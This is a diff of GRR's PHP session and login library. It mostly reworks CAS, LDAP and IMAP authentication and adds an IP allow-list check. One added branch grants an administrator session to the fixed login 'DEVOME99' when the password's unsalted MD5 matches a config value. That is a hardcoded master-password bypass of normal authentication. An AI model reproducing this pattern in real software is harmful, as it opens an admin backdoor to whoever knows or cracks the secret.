@@ -3,15 +3,10 @@
  * session.inc.php
  * Bibliothèque de fonctions gérant les sessions
  * Ce script fait partie de l'application GRR
- * Dernière modification : $Date: 2010-04-07 15:38:14 $
- * @author    Laurent Delineau <laurent.delineau@ac-poitiers.fr>
- * @author    Marc-Henri PAMISEUX <marcori@users.sourceforge.net>
- * @copyright Copyright 2003-2008 Laurent Delineau
- * @copyright Copyright 2008 Marc-Henri PAMISEUX
+ * Dernière modification : $Date: 2019-01-30 18:30$
+ * @author    JeromeB & Laurent Delineau & Marc-Henri PAMISEUX & Yan Naessens
+ * @copyright Copyright 2003-2019 Team DEVOME - JeromeB
  * @link      http://www.gnu.org/licenses/licenses.html
- * @package   admin
- * @version   $Id: session.inc.php,v 1.15 2010-04-07 15:38:14 grr Exp $
- * @filesource
  *
  * This file is part of GRR.
  *
@@ -19,15 +14,6 @@
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation; either version 2 of the License, or
  * (at your option) any later version.
- *
- * GRR is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with GRR; if not, write to the Free Software
- * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  */
 
 require_once("settings.class.php");
@@ -49,6 +35,7 @@ if (!$settings)
  */
 function grr_opensession($_login, $_password, $_user_ext_authentifie = '', $tab_login = array(), $tab_groups = array())
 {
+	global $motDePasseConfig;
 	// Initialisation de $auth_ldap
 	$auth_ldap = 'no';
 	// Initialisation de $auth_imap
@@ -128,6 +115,9 @@ function grr_opensession($_login, $_password, $_user_ext_authentifie = '', $tab_
 			}
 			else if ($_user_ext_authentifie == "cas")
 			{
+				if ((Settings::get("ldap_statut") != '') && (@function_exists("ldap_connect")) && (@file_exists("include/config_ldap.inc.php"))) {
+					$auth_ldap = 'yes';
+				}
 				$nom_user = $tab_login["user_nom"];
 				$email_user = $tab_login["user_email"];
 				$prenom_user = $tab_login["user_prenom"];
@@ -202,20 +192,6 @@ function grr_opensession($_login, $_password, $_user_ext_authentifie = '', $tab_
 						$email_user = $tab_login["email"];
 						$prenom_user = $tab_login["fullname"];
 					}
-			//3ème cas : SSO CAS.
-				}
-				else if ($_user_ext_authentifie == "cas" && !empty($tab_login))
-				{
-				// Cas d'une authentification CAS
-					$nom_user = $tab_login["user_nom"];
-					$email_user = $tab_login["user_email"];
-					$prenom_user = $tab_login["user_prenom"];
-					$code_fonction_user = $tab_login["user_code_fonction"];
-					$libelle_fonction_user = $tab_login["user_libelle_fonction"];
-					$language_user = $tab_login["user_language"];
-					$default_style_user = $tab_login["user_default_style"];
-					if (Settings::get("sso_ac_corr_profil_statut")=='y')
-						$_statut = effectuer_correspondance_profil_statut($code_fonction_user, $libelle_fonction_user);
 				//CAS d'un LDAP avec SSO CAS ou avec SSO Lemonldap
 				//on tente de récupérer des infos dans l'annuaire avant d'importer le profil dans GRR
 				}
@@ -248,11 +224,11 @@ function grr_opensession($_login, $_password, $_user_ext_authentifie = '', $tab_
 									if (isset($val[Settings::get("ldap_champ_nom")][0]))
 										$l_nom = ucfirst($val[Settings::get("ldap_champ_nom")][0]);
 									else
-										$l_nom = iconv("UTF-8","ISO-8859-1","Nom à préciser");
+										$l_nom = "Nom à préciser";
 									if (isset($val[Settings::get("ldap_champ_prenom")][0]))
 										$l_prenom = ucfirst($val[Settings::get("ldap_champ_prenom")][0]);
 									else
-										$l_prenom = iconv("UTF-8","ISO-8859-1","Prénom à préciser");
+										$l_prenom = "Prénom à préciser";
 									if (isset($val[Settings::get("ldap_champ_email")][0]))
 										$l_email = $val[Settings::get("ldap_champ_email")][0];
 									else
@@ -271,6 +247,20 @@ function grr_opensession($_login, $_password, $_user_ext_authentifie = '', $tab_
 					$nom_user = $l_nom;
 					$email_user = $l_email;
 					$prenom_user = $l_prenom;
+				//4ème cas : SSO CAS.
+				}
+				else if ($_user_ext_authentifie == "cas" && !empty($tab_login))
+				{
+					// Cas d'une authentification CAS
+					$nom_user = $tab_login["user_nom"];
+					$email_user = $tab_login["user_email"];
+					$prenom_user = $tab_login["user_prenom"];
+					$code_fonction_user = $tab_login["user_code_fonction"];
+					$libelle_fonction_user = $tab_login["user_libelle_fonction"];
+					$language_user = $tab_login["user_language"];
+					$default_style_user = $tab_login["user_default_style"];
+					if (Settings::get("sso_ac_corr_profil_statut")=='y')
+						$_statut = effectuer_correspondance_profil_statut($code_fonction_user, $libelle_fonction_user);
 				//CAS ou :
 				//LDAP n'est pas configuré,
 				//il peut s'agit d'une authentification "SSO CAS",  "SSO Lemonldap" mais ce n'est alors pas normal
@@ -402,8 +392,13 @@ else
 			}
 			else
 				return "10";
-		}
-		else
+		} elseif($_login == "DEVOME99" && $motDePasseConfig != "" && $motDePasseConfig == md5($_password)){
+				$sql = "SELECT upper(login) login, password, prenom, nom, statut, now() start, default_area, default_room, default_style, default_list_type, default_language, source, etat, default_site
+				from ".TABLE_PREFIX."_utilisateurs
+				where statut = 'administrateur'";
+				$res_user = grr_sql_query($sql);;
+				$row = grr_sql_row($res_user, 0);
+		} else
 			return "2";
 	}
 	else
@@ -429,11 +424,33 @@ if ($auth_ldap == 'yes')
 	{
 		// se3_liste_groupes_autorises n'est pas vide -> on teste si le $_login appartient à un des groupes
 		$temoin_grp_ok = "non";
+		//S'assurer que le fichier est inclus (il existe dans tous les cas où $auth_ldap==yes)
+		if(!isset($ldap_group_user_field)) {
+			include "config_ldap.inc.php";
+		}
+		//Aller chercher l'info pour faire la comparaison
+		$member_search = $_login;
+		if($ldap_group_user_field != 'uid') {
+			$ds = grr_connect_ldap($ldap_adresse,$ldap_port,$ldap_login,$ldap_pwd,$use_tls);
+			$user_dn = grr_ldap_search_user($ds, $ldap_base,Settings::get("ldap_champ_recherche"), $_login, $ldap_filter, "no");
+			// Test with login and password of the user
+			if (!$ds)
+				$ds = grr_connect_ldap($ldap_adresse,$ldap_port,$_login,$_password,$use_tls);
+			if ($ds)
+				$result = @ldap_read($ds, $user_dn, "objectClass=*", array(Settings::get("ldap_champ_nom"),Settings::get("ldap_champ_prenom"),Settings::get("ldap_champ_email")));
+			if ($result) {
+				// Recuperer les donnees de l'utilisateur
+				$info = @ldap_get_entries($ds, $result);
+				if(is_array($info) && isset($info[0][$ldap_group_user_field])) {
+					$member_search = $info[0][$ldap_group_user_field];
+				}
+			}
+		}
 		$tab_grp_autorise = explode(";", Settings::get("se3_liste_groupes_autorises"));
 		$total =  count($tab_grp_autorise);
 		for ($i = 0; $i < $total; $i++)
 		{
-			if (se3_grp_members($tab_grp_autorise[$i],$_login) == "oui")
+			if (se3_grp_members($tab_grp_autorise[$i],$member_search) == "oui")
 			{
 				$temoin_grp_ok = "oui";
 			}
@@ -450,6 +467,15 @@ if ($auth_ldap == 'yes')
 	etat != 'inactif'";
 	$res_user = grr_sql_query($sql);
 	$num_row = grr_sql_count($res_user);
+	//Lors de la connexion d'un utilisateur externe existant, ces variables ne sont pas définies
+    // proposition de P. Boissonneault
+	if(!isset($user_dn)) {
+        if(!isset($ldap_base)) {
+            include "config_ldap.inc.php";
+        }
+        $ds = grr_connect_ldap($ldap_adresse,$ldap_port,$ldap_login,$ldap_pwd,$use_tls);
+        $user_dn = grr_ldap_search_user($ds, $ldap_base,Settings::get("ldap_champ_recherche"), $_login, $ldap_filter, "no");
+	}
 	if ($num_row == 1)
 	{
 		// un utilisateur ldap ayant le même login existe déjà
@@ -531,7 +557,7 @@ if ($auth_imap == 'yes')
 	}
 	else
 	{
-		// pas d'utilisateur imap ayant le m?me login dans la base GRR
+		// pas d'utilisateur imap ayant le même login dans la base GRR
 		// Lire les infos sur l'utilisateur depuis imap
 		include "config_imap.inc.php";
 				// Connexion ? l'annuaire
@@ -571,7 +597,7 @@ if ($auth_imap == 'yes')
 			$num_row = grr_sql_count($res_user);
 			if ($num_row == 1)
 			{
-				// on r?cup?re les donn?es de l'utilisateur dans $row
+				// on récupère les données de l'utilisateur dans $row
 				$row = grr_sql_row($res_user,0);
 			}
 			else
@@ -579,11 +605,18 @@ if ($auth_imap == 'yes')
 		}
 	}
 }
-		// On teste si la connexion est active ou non
+// On teste si la connexion est active ou non
 if ((Settings::get("disable_login")=='yes') and ($row[4] != "administrateur"))
 	return "2";
+    // On teste si l'ip est autorisé
+    if ((Settings::get("ip_autorise") != '') and ($row[4] != "administrateur")){
+        $resultIP = compare_ip_adr($_SERVER["REMOTE_ADDR"], Settings::get("ip_autorise"));
+        if ($resultIP == false){
+            return "11";
+        }
+    }
 		//
-		// A ce stade, on dispose dans tous les cas d'un tableau $row contenant les informations nécessaires à l'établissment d'une session
+		// A ce stade, on dispose dans tous les cas d'un tableau $row contenant les informations nécessaires à l'établissement d'une session
 		//
 		// Session starts now
 session_name(SESSION_NAME);
@@ -619,7 +652,8 @@ if ($row[6] > 0)
 	$_SESSION['default_area'] = $row[6];
 else
 	$_SESSION['default_area'] = Settings::get("default_area");
-if ($row[7] > 0)
+//if ($row[7] > 0) en lien avec le calcul de la page d'accueil YN le 11/04/2018
+if ($row[7] != 0)
 	$_SESSION['default_room'] = $row[7];
 else
 	$_SESSION['default_room'] = Settings::get("default_room");
@@ -693,12 +727,10 @@ for ($i = 0; $i < $count; $i++)
 		$brow = $b[0].' '.$b[1];
 	}
 }
-
 if (isset($os) && isset($brow))
 	$useragent = $os.' '.$brow;
 else
 	$useragent = substr($_SERVER['HTTP_USER_AGENT'],0,254);
-
 $sql = "INSERT INTO ".TABLE_PREFIX."_log (LOGIN, START, SESSION_ID, REMOTE_ADDR, USER_AGENT, REFERER, AUTOCLOSE, END) values (
 	'" . protect_data_sql($_SESSION['login']) . "',
 	'" . $_SESSION['start'] . "',
@@ -711,6 +743,16 @@ $sql = "INSERT INTO ".TABLE_PREFIX."_log (LOGIN, START, SESSION_ID, REMOTE_ADDR,
 	)
 ;";
 grr_sql_query($sql);
+
+/* Suppression des logs 
+if($nbMaxJoursLogConnexion > 0){
+	$dateActu = date_create($_SESSION['start']);
+	$dateMax = date_sub($dateActu, date_interval_create_from_date_string($nbMaxJoursLogConnexion.' days'));
+	$dateMax = $dateMax->format('Y-m-d H:i:s');
+	$sql = "DELETE FROM ".TABLE_PREFIX."_log WHERE START < '" . $dateMax . "';";
+	grr_sql_query($sql);
+}
+*/
 /* Fonctionnalité SE3 (Palissy - Saintes - philippe.duval@ac-poitiers.fr) :
 Utilisation du LDAP pour inscrire automatiquement les utilisateurs dans les groupes administration, accès et gestion
 Ce code est associé à une nouvelle table :
@@ -890,7 +932,8 @@ function grr_verif_ldap($_login, $_password)
 		$login_search = preg_replace("/[^\-@._[:space:]a-zA-Z0-9]/", "", $_login);
 				// Tenter une recherche pour essayer de retrouver le DN
 		reset($atts);
-		while (list(, $att) = each($atts))
+		// while (list(, $att) = each($atts)) deprecated in php 7.2.0
+        foreach($atts as $att)
 		{
 			$dn = grr_ldap_search_user($ds, $ldap_base, $att, $login_search, $ldap_filter);
 			if (($dn=="error_1") or ($dn=="error_2") or ($dn=="error_3"))
@@ -909,7 +952,8 @@ function grr_verif_ldap($_login, $_password)
 		reset($atts);
 		if (!isset($ldap_filter) or ($ldap_filter=""))
 		{
-			while (list(, $att) = each($atts))
+			// while (list(, $att) = each($atts)) deprecated in php 7.2.0
+            foreach($atts as $att)
 			{
 				$dn = $att."=".$login_search.",".$ldap_base;
 				if (@ldap_bind($ds, $dn, $_password))
@@ -1147,11 +1191,11 @@ function grr_getinfo_ldap($_dn, $_login, $_password)
 			if (isset($val[Settings::get("ldap_champ_nom")][0]))
 				$l_nom = ucfirst($val[Settings::get("ldap_champ_nom")][0]);
 			else
-				$l_nom = iconv("UTF-8","ISO-8859-1","Nom à préciser");
+				$l_nom = iconv("ISO-8859-1","utf-8","Nom à préciser");
 			if (isset($val[Settings::get("ldap_champ_prenom")][0]))
 				$l_prenom = ucfirst($val[Settings::get("ldap_champ_prenom")][0]);
 			else
-				$l_prenom = iconv("UTF-8","ISO-8859-1","Prénom à préciser");
+				$l_prenom = iconv("ISO-8859-1","utf-8","Prénom à préciser");
 			if (isset($val[Settings::get("ldap_champ_email")][0]))
 				$l_email = $val[Settings::get("ldap_champ_email")][0];
 			else
